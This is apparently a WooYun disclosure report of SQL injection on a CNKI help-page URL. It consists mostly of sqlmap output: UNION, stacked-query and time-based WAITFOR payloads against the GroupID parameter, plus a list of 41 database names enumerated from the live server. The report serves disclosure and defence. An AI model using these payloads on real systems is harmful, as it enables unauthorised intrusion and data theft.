wybug_title: 中国知网某处sql注入漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2013-06-11：	积极联系厂商并且等待厂商认领中，细节不对外公开									2013-07-26：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中国知网某处存在sql注入漏洞 详细说明：  中国知网在留言页面有sql注入漏洞：http://help.cnki.net/Live800_1_2.aspx?GroupID=502&PageID=101007&Name=&CookieName=TTKN_OnLine_800手工试了下，GroupID处有问题直接sqlmap：
---Place: GETParameter: GroupID    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: GroupID=-3505 UNION ALL SELECT NULL,CHAR(58)+CHAR(118)+CHAR(99)+CHAR(114)+CHAR(58)+CHAR(73)+CHAR(104)+CHAR(102)+CHAR(80)+CHAR(121)+CHAR(81)+CHAR(67)+CHAR(120)+CHAR(70)+CHAR(101)+CHAR(58)+CHAR(118)+CHAR(97)+CHAR(121)+CHAR(58)-- &PageID=101007&Name=&CookieName=TTKN_OnLine_800    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: GroupID=502; WAITFOR DELAY '0:0:5'--&PageID=101007&Name=&CookieName=TTKN_OnLine_800    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: GroupID=502 WAITFOR DELAY '0:0:5'--&PageID=101007&Name=&CookieName=TTKN_OnLine_800---[13:09:16] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[13:09:16] [INFO] fetching database names[13:09:16] [INFO] the SQL query used returns 41 entriesavailable databases [41]:                                                      [*] Agriculture[*] AgricultureLog[*] ALMCLog[*] AMI20[*] BMI20[*] callthink[*] Callthink_cdr[*] Callthink_crm[*] ChouJiang[*] CMI20[*] CMU20[*] DTR[*] EMI20[*] FAXDB[*] FMI15[*] HR[*] KaoQin[*] LMI20[*] master[*] MessageInfo[*] model[*] msdb[*] OA_00001[*] OA_0001[*] OAIISLog[*] PMI20[*] ReportServer[*] ReportServerTempDB[*] SMI10[*] talentel_cnf[*] Talentel_log[*] TELE3000[*] tempdb[*] TTKNOA[*] UFDATA[*] WFI20[*] WFMS[*] WMI10[*] XXFB[*] YC_SmartCard_jc[*] YC_SmartCard_jf[13:09:16] [INFO] fetched data logged to text files under './output/help.cnki.net'
   漏洞证明：  



   修复方案：  过滤   版权声明：转载请注明来源 Alcar@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
